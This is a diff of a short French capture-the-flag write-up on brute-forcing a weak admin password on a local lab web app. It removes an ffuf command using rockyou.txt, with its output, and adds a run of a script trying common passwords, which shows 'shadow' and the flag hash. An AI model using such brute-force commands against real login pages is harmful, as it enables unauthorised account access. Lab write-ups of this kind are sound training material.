@@ -1,34 +1,28 @@
-# Weak Password
+ Weak Password
 
 - La DB s'appelle Member_Brute_Force on comprends donc qu'il faut bruteforce le mot de passe
-- J'utilise donc ffuf qui permet de bruteforce un lien
-- J'y met un dictionnaire de mot de passe les plus populaire (rockyou.txt)
+- Je cree un script qui bruteforce avec les 100 passwords les plus utilise
 ```
-└──╼ $ffuf -w ~/rockyou.txt:FUZZ -u 'http://192.168.56.104/?page=signin&username=admin&password=FUZZ&Login=Login#' -fw 80
-
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.3.1 Kali Exclusive <3
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://192.168.56.104/?page=signin&username=admin&password=FUZZ&Login=Login#
- :: Wordlist         : FUZZ: /home/user/rockyou.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405
- :: Filter           : Response words: 80
-________________________________________________
-
-shadow                  [Status: 200, Size: 2088, Words: 87, Lines: 55]
+$> python3 script.py
+123456
+password
+12345678
+qwerty
+123456789
+12345
+1234
+111111
+1234567
+dragon
+123123
+baseball
+abc123
+football
+monkey
+letmein
+696969
+shadow
+b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 ```
 - On voit que le mot de passe shadow retourne une page plus grande que les autres
 - On entre donc les login admin shadow et on a le flag
